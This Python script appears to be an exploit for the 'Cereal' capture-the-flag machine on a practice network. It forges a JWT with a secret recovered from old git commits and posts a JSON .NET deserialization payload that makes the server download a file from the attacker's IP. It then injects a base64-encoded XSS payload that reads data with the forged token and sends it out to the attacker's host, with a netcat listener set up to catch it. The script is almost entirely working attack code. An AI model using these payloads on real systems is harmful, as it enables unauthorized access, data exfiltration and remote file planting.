import requests
import netifaces as ni
import jwt
import json
import base64
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from datetime import datetime, timedelta

def get_ip(interface):
    """find your IP on a given interface"""
    ni.ifaddresses(interface)
    ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
    print("IP Address: " + ip)
    
    return ip

def generate_token():
    """generates a JWT token"""
    
    # take key from old git code - commit ID 8f2a1a88f15b9109e1f63e4e4551727bfb38eee5
    key = "secretlhfIH&FY*#oysuflkhskjfhefesf"

    # encode with HMAC-SHA-256
    token = jwt.encode({"exp": datetime.utcnow() + timedelta(days=7), "name": 1}, key, algorithm="HS256")
    print("Generated token: " + token)
    
    return token
    
def target_cereal(ip, base_url, base_headers):
    """POST a cereal request to create the target cereal
    this will be deserialised by an XSS request and trigger a download"""
    
    print("\n=== POSTING TARGET CEREAL ===\n")
    
    download_url = "https://{}/test.txt".format(ip)
    print("Creating target cereal, which will download from URL {} when deserialised".format(download_url))

    target_json_string = "{\"JSON\":\"{\\\"$type\\\":\\\"Cereal.DownloadHelper, Cereal\\\",\\\"URL\\\": " + download_url +  ",\\\"FilePath\\\":\\\"test.txt\\\"}\"}"
    
    print("JSON submitted: " + target_json_string)

    targetResp = requests.post(base_url, data=target_json_string, headers=base_headers, verify=False)
    print("\nResponse:\nResponse Code: {code}\nResponse Text: {text}".format(code=targetResp.status_code, text=targetResp.text))

    target_id = str(json.loads(targetResp.text)["id"])
    print("Target cereal ID: " + target_id)
    
    return target_id
    
def xss_cereal(ip, base_url, base_headers, token, target_id):
    """POST a cereal request to trigger an XSS
    the XSS makes a HTTP request to deserialise the target cereal"""
    
    print("\n=== POSTING XSS CEREAL ===\n")
    
    js_string = 'var oReq = new XMLHttpRequest();oReq.open("GET", "https://cereal.htb/requests/{target_id}");oReq.setRequestHeader("Authorization", "Bearer {token}");oReq.send();var resp = btoa(oReq.responseText);console.log(resp);const image = document.createElement("img");image.src = "http://{ip}/".concat(resp);document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);'.format(target_id=target_id, token=token, ip=ip)
    
    print("Javascript to be injected: " + js_string + "\n")
    
    b64_js = base64.b64encode(js_string.encode('utf-8'))
    
    print("Base64 encoded javascript: " + b64_js.decode('utf-8') + "\n")
    
    xss_json_string = "{\"JSON\":\"{\\\"title\\\":\\\"[XSS](javascript: eval(atob(%22" + b64_js.decode('utf-8') + "%22%29%29)\\\",\\\"flavor\\\":\\\"f\\\",\\\"color\\\":\\\"#FFF\\\",\\\"description\\\":\\\"d\\\"}\"}"
    
    print("JSON submitted: " + xss_json_string)
    
    xssResp = requests.post(base_url, data=xss_json_string, headers=base_headers, verify=False)
    print("\nResponse:\nResponse Code: {code}\nResponse Text: {text}".format(code=xssResp.status_code, text=xssResp.text))
    
def main():
    # suppress warnings for self-signed SSL cert
    warnings.filterwarnings("ignore", category=InsecureRequestWarning)
    
    # remind user to start a listener
    print("Make sure to start a listener before this. Run the following command:\nsudo nc -lnvp 80\nThis will catch responses from your XSS and allow the DownloadHelper to grab your payload")
    input("Press enter to continue once you've started your listener...\n")

    # get tun0 IP address
    ip = get_ip("tun0")
    
    # set URL
    base_url = "https://10.10.10.217/requests"
    
    # generate a token
    token = generate_token()

    # set headers
    base_headers = {"Content-Type": "application/json", "Authorization": "Bearer {}".format(token), "Cache-Control": "max-age=0"}
    
    # generate a target cereal and get its ID
    target_id = target_cereal(ip, base_url, base_headers)
    
    xss_cereal(ip, base_url, base_headers, token, target_id)
    
main()
